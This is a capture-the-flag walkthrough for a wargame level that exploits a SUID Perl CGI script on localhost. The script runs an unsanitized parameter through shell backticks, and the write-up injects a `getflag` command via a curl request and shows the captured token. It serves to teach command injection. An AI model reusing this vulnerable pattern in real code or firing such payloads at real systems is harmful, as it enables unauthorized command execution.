# Level 04 - Command Injection via CGI

## Step 1: Examine available files

First, let's check what files we have in the current directory:

```sh
ls -l
```

We find a Perl script with the following permissions:

```
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

Note that this file is owned by `flag04` and has the SUID bit set, meaning it will run with the privileges of its owner.

## Step 2: Execute and analyze the script
When we run the script directly, we only get:
```
Content-type: text/html

```
Let's examine the script's content:
```sh
cat level04.pl
```

Output:
```pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

## Step 3: Understand the vulnerability
The script analysis reveals:
1. It's a CGI (Common Gateway Interface) script running on localhost port 4747
2. It takes a parametr named  "x" from web requests
3. It passes this parameter to a function that executes `echo $y` through a shell (using backticks `)
4. The value of the parameter is not sanitized before being passed th the shell

This is a classic command injection vulnerability. The backticks in Perl execute whateveris inside them in a shell, similar to `system()` or `exec()`.

## Step 4: Exploit the vulnerability

We can pass shell commands as the "x" parameter, and they'll be executed with flag04's privileges. By using backticks inside the parameter value, we can execute arbitrary commands:

```sh
curl 'localhost:4747/level04.pl?x=`getflag`'
```

When the script processes this request:

1. It extracts the parameter value (`getflag`)
2. The backticks tell the shell to execute this as a command
3. Since the script runs with flag04's privileges, `getflag` runs as flag04

## Step 5: Get the flag
The output from our curl command gives us the flag:

```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
